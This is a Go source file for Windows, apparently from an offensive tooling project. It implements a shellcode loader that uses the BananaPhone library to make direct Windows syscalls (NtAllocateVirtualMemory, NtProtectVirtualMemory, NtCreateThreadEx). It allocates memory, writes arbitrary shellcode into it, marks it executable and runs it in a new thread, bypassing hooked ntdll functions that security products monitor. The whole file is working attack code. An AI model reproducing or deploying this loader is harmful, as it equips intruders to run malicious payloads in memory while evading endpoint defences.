// +build windows

package execute_assembly

import (
	"errors"
	"fmt"
	"syscall"
	"unsafe"

	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"
)

//example of using bananaphone to execute shellcode in the current thread.
func executeShellcode(shellcode []byte) error {

	fmt.Println("Mess with the banana, die like the... banana?") //I found it easier to breakpoint the consolewrite function to mess with the in-memory ntdll to verify the auto-switch to disk works sanely than to try and live-patch it programatically.
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		fmt.Println(e)
		return errors.New("failed to load bananaphone")
	}
	fmt.Println("Bananaphone loaded")

	fmt.Println("loading NtAllocateVirtualMemory")
	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		return errors.New("failed to resolve NtAllocateVirtualMemory SysID")
	}
	fmt.Println("NtAllocateVirtualMemory loaded successfully")

	fmt.Println("loading NtProtectVirtualMemory")
	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		return errors.New("failed to resolve NtProtectVirtualMemory SysID")
	}
	createthread, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		return errors.New("failed to resolve NtCreateThreadEx")
	}
	fmt.Println("NtAllocateVirtualMemory loaded successfully")

	err := createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
	if err != nil {
		return err
	}
	return nil
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) error {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	fmt.Println("Running NtAllocateVirtualMemory...")
	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return errors.New("NtAllocateVirtualMemory failed")
	}
	fmt.Println("NtAllocateVirtualMemory was successful")

	fmt.Println("Writing Memory using bananaphone")
	//write memory
	bananaphone.WriteMemory(shellcode, baseA)
	fmt.Println("Memory successfully written")

	fmt.Println("Running NtProtectVirtualMemory...")
	var oldprotect uintptr
	r1, r = bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return errors.New("NtProtectVirtualMemory failed")
	}
	fmt.Println("NtProtectVirtualMemory was successful")

	fmt.Println("Running NtCreateThreadEx...")
	var hhosthread uintptr
	r1, r = bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return errors.New("NtCreateThreadEx failed")
	}
	fmt.Println("NtCreateThreadEx was successful!")
	return nil
}